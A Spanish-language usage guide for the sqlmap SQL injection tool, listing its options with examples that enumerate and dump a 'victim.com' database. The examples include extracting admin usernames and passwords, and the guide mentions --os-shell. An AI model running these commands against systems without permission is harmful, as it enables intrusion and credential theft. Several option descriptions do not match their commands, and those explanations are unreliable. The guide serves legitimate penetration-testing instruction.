# SQLMap - Guía de uso

## Descripción
sqlmap es una herramienta de prueba de penetración open source que automatiza la detección y explotación de vulnerabilidades de inyección SQL.

## Instalación
```bash
# Ubuntu/Debian
apt-get install sqlmap

# O desde git
git clone https://github.com/sqlmapproject/sqlmap.git
```

## Sintaxis Básica
```bash
sqlmap [opciones]
```

## Opciones Principales

### Identificación de Vulnerabilidades

```bash
# Prueba simple con una URL
sqlmap -u "http://example.com/page?id=1"

# Prueba en modo automático (crawling)
sqlmap -u "http://example.com" --crawl=1

# Prueba con cookie de sesión
sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=abc123; user=admin"
```

### Técnicas de Inyección

```bash
# Prueba con inyección en parámetros GET
sqlmap -u "http://example.com/page" --data="id=1&name=test"

# Prueba con inyección en parámetros POST
sqlmap -u "http://example.com/login" --data="user=admin&pass=123"

# Prueba con inyección en headers
sqlmap -u "http://example.com" --headers="X-Forwarded-For: 127.0.0.1"

# Prueba con inyección en parámetros URI
sqlmap -u "http://example.com/1' OR '1'='1"
```

### Niveles de Prueba

```bash
# Nivel 1 (básico)
sqlmap -u "http://example.com" --level=1

# Nivel 5 (máximo - prueba headers y cookies)
sqlmap -u "http://example.com" --level=5
```

### DBMS Específicos

```bash
# Especificar base de datos
sqlmap -u "http://example.com" --dbms=MySQL
sqlmap -u "http://example.com" --dbms=PostgreSQL
sqlmap -u "http://example.com" --dbms=Microsoft-SQLServer
sqlmap -u "http://example.com" --dbms=Oracle
sqlmap -u "http://example.com" --dbms=SQLite
```

### Extracción de Datos

```bash
# Listar bases de datos
sqlmap -u "http://example.com" --dbs

# Listar tablas de una base de datos
sqlmap -u "http://example.com" -D "nombre_db" --tables

# Listar columnas de una tabla
sqlmap -u "http://example.com" -D "nombre_db" -T "usuarios" --columns

# Extracción de datos
sqlmap -u "http://example.com" -D "nombre_db" -T "usuarios" -C "username,password" --dump
```

### Opciones Avanzadas

```bash
# Especificar técnicas de inyección
sqlmap -u "http://example.com" --technique="BEUST"

# Donde: B=Blind, E=Error-based, U=Union, S=Stacked, T=Time-based

# bypass de WAF con user-agent personalizado
sqlmap -u "http://example.com" --user-agent="Mozilla/5.0" --random-agent

# Parallelism (acelerar explotación)
sqlmap -u "http://example.com" --threads=10

# Save/Load session
sqlmap -u "http://example.com" --save=sess.txt
sqlmap -u "http://example.com" --load=sess.txt
```

### Filtros y Limitaciones

```bash
# Extraer solo datos que coincidan con un patrón
sqlmap -u "http://example.com" --dump --start=1 --stop=10

# Excluir columnas específicas
sqlmap -u "http://example.com" -D "nombre_db" -T "usuarios" --exclude-sysdb --dump --technique=U
```

## Ejemplos Prácticos

### 1. Inyección SQL Básica
```bash
sqlmap -u "http://victim.com/search.php?q=test" --level=5 --risk=3
```

### 2. Extracción Completa de Base de Datos
```bash
# Paso 1: Listar bases de datos
sqlmap -u "http://victim.com/page?id=1" --dbs

# Paso 2: Listar tablas
sqlmap -u "http://victim.com/page?id=1" -D "empresa" --tables

# Paso 3: Listar columnas
sqlmap -u "http://victim.com/page?id=1" -D "empresa" -T "admins" --columns

# Paso 4: Dump de datos
sqlmap -u "http://victim.com/page?id=1" -D "empresa" -T "admins" -C "user,pass" --dump
```

### 3. Con Autenticación
```bash
sqlmap -u "http://victim.com/login" \
  --data="user=admin&pass=123" \
  --cookie="PHPSESSID=abc123" \
  --level=5
```

### 4. Inyección en Header
```bash
sqlmap -u "http://victim.com/" \
  --headers="X-Forwarded-For: 127.0.0.1" \
  -p "X-Forwarded-For"
```

## Tabla de Opciones Comunes

| Opción | Descripción |
|--------|-------------|
| `-u` | URL objetivo |
| `--data` | Datos POST |
| `--cookie` | Cookies |
| `--dbms` | Tipo de base de datos |
| `--level` | Nivel de prueba (1-5) |
| `--risk` | Riesgo (1-3) |
| `--dbs` | Listar bases de datos |
| `--tables` | Listar tablas |
| `--columns` | Listar columnas |
| `--dump` | Extraer datos |
| `--technique` | Técnicas de inyección |
| `--os-shell` | Obtener shell del sistema operativo |

## Técnicas de Inyección Disponibles

- **B**: Blind SQL Injection (incluso con respuesta vacía)
- **E**: Error-based (usa mensajes de error)
- **U**: Union-based (usa UNION SELECT)
- **S**: Stacked queries (consultas anidadas)
- **T**: Time-based (tiempo de respuesta)
- **Q**: Inline queries

Recomendación: Usar `--technique="BEUST"` para pruebas completas.
